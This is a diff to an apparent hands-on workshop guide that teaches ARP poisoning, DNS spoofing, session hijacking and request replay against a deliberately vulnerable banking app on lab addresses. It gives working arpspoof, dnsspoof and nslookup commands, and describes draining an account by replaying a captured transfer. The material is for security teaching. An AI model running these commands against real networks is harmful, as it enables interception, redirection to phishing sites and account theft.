@@ -237,28 +237,37 @@ You should now see **complete** HTTP conversations — request headers, response
 
 The victim uses `lab-dns` (10.0.0.30) to resolve `workshop.lab` → `10.0.0.20`.
 
-With ARP poisoning still active against the DNS server:
+*Note: If you still have arpspoof running from Lab 3, stop it with `Ctrl+C` first. In Lab 3 we poisoned the path between the victim and Web Server. Now, we need to poison the path between the victim and the **DNS Server** (`10.0.0.30`).*
 
 Terminal 1 — Poison the victim↔DNS path:
 ```bash
 sudo arpspoof -i $BRIDGE -t 10.0.0.15 10.0.0.30
 ```
 
+> **Why do this?** This forces all the victim's DNS queries to physically flow through your Kali machine first, putting you in the perfect position to intercept them.
+
 Terminal 2 — Spoof DNS responses:
 ```bash
-# Create a hosts file pointing workshop.lab to your IP
+# Create a cheat sheet telling dnsspoof that workshop.lab belongs to YOU (10.0.0.10)
 echo "10.0.0.10 workshop.lab" > /tmp/fakehosts
 
+# Listen for DNS requests and shoot back fake replies
 sudo dnsspoof -i $BRIDGE -f /tmp/fakehosts host 10.0.0.15 and udp port 53
 ```
 
+> **What does dnsspoof do?** Because you are in the middle of the network, `dnsspoof` perfectly sees the victim asking for `workshop.lab`. It instantly shoots back a fake "DNS Reply" packet containing your attacker IP address (`10.0.0.10`) *before* the real DNS server even has a chance to respond.
+
 **Verify:**
 ```bash
-# From the victim, workshop.lab should now resolve to YOU
+# Force the victim to ask the DNS server for the IP of workshop.lab
 sudo docker exec lab-victim nslookup workshop.lab 10.0.0.30
 ```
 
-> 💡 **Takeaway:** DNS has no built-in authentication. A MitM attacker can forge DNS responses to redirect users anywhere.
+**How to read the output:**
+The output should now say `Name: workshop.lab \ Address: 10.0.0.10`. 
+This verifies that your attack worked! If the victim opened their browser to visit `http://workshop.lab`, their browser would now connect directly to **your attacker machine** instead of the real bank.
+
+> 💡 **Takeaway:** DNS has no built-in authentication. A MitM attacker can forge DNS responses to seamlessly redirect users to phishing sites.
 
 ---
 
@@ -284,7 +293,7 @@ You should see a `200 OK` response with the transfer page HTML — you're in!
 
 **Step 3: Hijack the session in the browser (visual demo)**
 
-This is the real payoff — you'll see the victim's banking dashboard in your own browser.
+You'll see the victim's banking dashboard in your own browser.
 
 1. Open **Firefox** on your Kali machine and go to `http://10.0.0.20/transfer`
 
@@ -346,8 +355,6 @@ docker compose down --rmi all
 ---
 
 ## ☁️ Phase 2: Cloud Attack (EC2)
-
-After completing the local labs, pivot to attacking a live cloud-hosted version of the vulnerable app. See [DEPLOY_EC2.md](./DEPLOY_EC2.md) for deployment instructions.
 
 In this phase, we transition from the local sandbox to a live cloud environment. Because this is an online synchronous workshop, participants cannot sniff each other's traffic over the internet. 
 
@@ -419,7 +426,6 @@ Replay the instructor's transfer request to drain their account:
    done
    ```
 
-> 💡 **Why this works:** The instructor's HTTP traffic travels unencrypted over the WiFi. Anyone on the same network can read it. There are no CSRF tokens, no nonces, and no HTTPS — so the captured session can be reused and replayed indefinitely.
 
 ---
 
